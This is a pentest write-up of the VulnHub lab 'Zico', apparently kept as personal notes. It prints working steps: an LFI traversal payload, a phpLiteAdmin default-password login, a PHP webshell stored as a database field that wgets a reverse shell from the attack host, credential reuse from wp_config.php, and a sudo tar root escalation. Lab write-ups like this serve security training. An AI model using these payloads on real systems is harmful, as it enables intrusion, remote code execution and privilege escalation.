---
tags:
  - box
platform: VulnHub
os: Linux
difficulty:
date_completed:
mitre_attack: T1190, T1078, T1505.003, T1552.001, T1548.003
status: rooted
---

## Target

**IP Address:** 10.0.2.4

## Recon

### Port Scan

```bash
sudo nmap -sC -sV -p- -oA zico.tcp 10.0.2.4 -v
```

![Pasted image 20250214132847](../../Images/Zico/Pasted%20image%2020250214132847.png)

## Enumeration

```
http://10.0.2.4
```

![Pasted image 20250214133215](../../Images/Zico/Pasted%20image%2020250214133215.png)

```
http://10.0.2.4/view.php?page=tools.html
```

![Pasted image 20250214133149](../../Images/Zico/Pasted%20image%2020250214133149.png)

The `page` parameter on `view.php` looked worth testing for LFI:

```
http://10.0.2.4/view.php?page=../../../../../../../../etc/passwd
```

![Pasted image 20250214133238](../../Images/Zico/Pasted%20image%2020250214133238.png)

Confirmed LFI. Ran a directory/file fuzz for anything else on the site:

```bash
ffuf -u http://10.0.2.4/FUZZ -w /opt/tools/SecLists/Discovery/Web-Content/big.txt
```

![Pasted image 20250214133329](../../Images/Zico/Pasted%20image%2020250214133329.png)

Found `/dbadmin`.

```
http://10.0.2.4/dbadmin
```

![Pasted image 20250214133406](../../Images/Zico/Pasted%20image%2020250214133406.png)

Identified the software as phpLiteAdmin:

```bash
searchsploit phplite
searchsploit -x 24044
```

![Pasted image 20250214133445](../../Images/Zico/Pasted%20image%2020250214133445.png)
![Pasted image 20250214133524](../../Images/Zico/Pasted%20image%2020250214133524.png)
![Pasted image 20250214133548](../../Images/Zico/Pasted%20image%2020250214133548.png)

## Exploitation

Logged into phpLiteAdmin with the default password:

```
http://10.0.2.4/dbadmin
Password=admin
```

![Pasted image 20250214133743](../../Images/Zico/Pasted%20image%2020250214133743.png)

Used phpLiteAdmin to create a new SQLite database that itself is a valid PHP webshell (a well-known phpLiteAdmin technique - the database file gets written to disk with a `.php` extension and a crafted field default value):

```
create database hack.php
create table shell with 1 field
create field shell with text value and default value of '<?php system("wget http://10.0.2.5:8000/shell.php -O /tmp/shell.php; php /tmp/shell.php"); ?>'
```

![Pasted image 20250214133939](../../Images/Zico/Pasted%20image%2020250214133939.png)

Modified a pentestmonkey PHP reverse shell to point at the attack box IP/port, hosted it with `python -m http.server`, and started a listener with `nc -lvnp 4444`.

Triggered the malicious database file through the LFI to execute it:

```
http://10.0.2.4/view.php?page=../../../../../../../../../usr/databases/hack.php
```

![Pasted image 20250214134257](../../Images/Zico/Pasted%20image%2020250214134257.png)

Got a shell back. Explored from there:

```bash
cd /home/zico
ls -al
cat to_do.txt
cd wordpress
cat wp_config.php
su zico
# or: ssh zico@10.0.2.4
```

Found WordPress DB credentials in `wp_config.php`, reused them to become `zico`.

![Pasted image 20250214134617](../../Images/Zico/Pasted%20image%2020250214134617.png)
![Pasted image 20250214134644](../../Images/Zico/Pasted%20image%2020250214134644.png)

## Privilege Escalation

```bash
sudo -l
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

`sudo -l` showed zico can run `tar` as root - the `--checkpoint-action=exec` flag is a well-known GTFOBins technique that runs an arbitrary command as root during a tar operation.

![Pasted image 20250214134812](../../Images/Zico/Pasted%20image%2020250214134812.png)
![Pasted image 20250214134829](../../Images/Zico/Pasted%20image%2020250214134829.png)

## Flags

**Root/System:** captured via the `tar --checkpoint-action=exec` GTFOBins technique above.

## Lessons Learned

phpLiteAdmin's "create a database with a .php extension containing a PHP payload as a field default" trick is a great reminder that any admin panel letting you control a file's name/extension and stored content is a potential webshell primitive, even without an explicit file-upload feature. `sudo tar` with no command restrictions is one of the most reliable GTFOBins one-liners for a root shell - always check `sudo -l` output against GTFOBins before looking for anything more complex.
